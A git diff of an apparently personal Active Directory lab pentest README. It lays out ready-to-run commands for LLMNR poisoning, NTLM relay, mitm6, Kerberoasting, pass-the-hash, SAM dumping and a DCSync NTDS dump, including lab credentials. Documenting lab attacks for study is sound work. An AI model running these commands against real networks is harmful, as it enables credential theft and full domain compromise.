@@ -19,17 +19,34 @@ sudo responder -I eth0 -dwv
 ```
 ![LLMNR Poisoning](Screenshots/01-llmnr-poisoning.png)
 
+---
+
 **Hash Cracking** — Captured NTLMv2 hash cracked offline using Hashcat with rockyou.txt wordlist.
 ```bash
 hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 ![Hash Cracked](Screenshots/02-hash-cracked.png)
 
-**SMB Relay Attack** — Instead of cracking, relay the captured NTLM authentication to another machine to dump SAM hashes.
+---
+
+**SMB Relay Attack** — Relay captured NTLM authentication to another machine to dump SAM hashes.
+
+> Run in two separate terminals simultaneously:
+
+**Terminal 1:**
+```bash
+sudo responder -I eth0 -dwv --lm
+```
+**Terminal 2:**
 ```bash
 sudo ntlmrelayx.py -tf target_relay.txt -smb2support -i
 ```
 ![SMB Relay Setup](Screenshots/03-smb-relay-setup.png)
+
+**Dump SAM hashes after obtaining credentials:**
+```bash
+netexec smb 192.168.100.13 -u thanhthao -p 'Welcome1' --sam
+```
 ![SAM Hashes Dump](Screenshots/04-sam-hashes-dump.png)
 
 ---
@@ -37,8 +54,15 @@ sudo ntlmrelayx.py -tf target_relay.txt -smb2support -i
 ### 2. Post-Exploitation / Lateral Movement
 
 **IPv6 Attack (mitm6)** — Abuse IPv6 DNS to perform a man-in-the-middle attack, relay authentication over LDAPS to create a new user with DCSync privileges.
+
+> Run in two separate terminals simultaneously:
+
+**Terminal 1:**
 ```bash
 sudo mitm6 -d giahuy.local --ignore-nofqdn -i eth0
+```
+**Terminal 2:**
+```bash
 sudo ntlmrelayx.py -6 -t ldaps://192.168.100.131 -wh fakewpad.giahuy.local -l loot
 ```
 ![mitm6 Setup](Screenshots/05-ipv6-mitm6-setup.png)
@@ -60,12 +84,20 @@ sudo bloodhound-python -d giahuy.local -u thanhthao -p 'Welcome1' -ns 192.168.10
 ### 4. Privilege Escalation
 
 **Kerberoasting** — Request TGS tickets for service accounts and crack them offline to obtain plaintext passwords.
+
+**Step 1 - Request TGS ticket:**
 ```bash
 sudo GetUserSPNs.py giahuy.local/thanhthao:'Welcome1' -dc-ip 192.168.100.131 -request
-hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
 ```
 ![Kerberoasting - SPN Found](Screenshots/09-kerberoasting-spn.png)
+
+**Step 2 - Crack TGS hash offline:**
+```bash
+hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
+```
 ![Kerberoasting - Password Cracked](Screenshots/10-kerberoasting-cracked.png)
+
+---
 
 **Pass-the-Hash** — Use the dumped NTLM hash to authenticate without knowing the plaintext password, achieving a SYSTEM shell.
 ```bash
@@ -77,9 +109,9 @@ smbexec.py Administrator@192.168.100.13 -hashes aad3b435b51404eeaad3b435b51404ee
 
 ### 5. Domain Compromise
 
-**NTDS.dit Dump** — Full domain credential dump from the Domain Controller using DCSync.
+**NTDS.dit Dump** — Full domain credential dump from the Domain Controller using DCSync via DRSUAPI method.
 ```bash
-secretsdump.py giahuy.local/Administrator@192.168.100.131 -hashes <hash>
+secretsdump.py giahuy.local/Administrator@192.168.100.131 -hashes aad3b435b51404eeaad3b435b51404ee:<NT_HASH>
 ```
 ![NTDS Dump - Full Domain Credentials](Screenshots/12-ntds-dump.png)
 
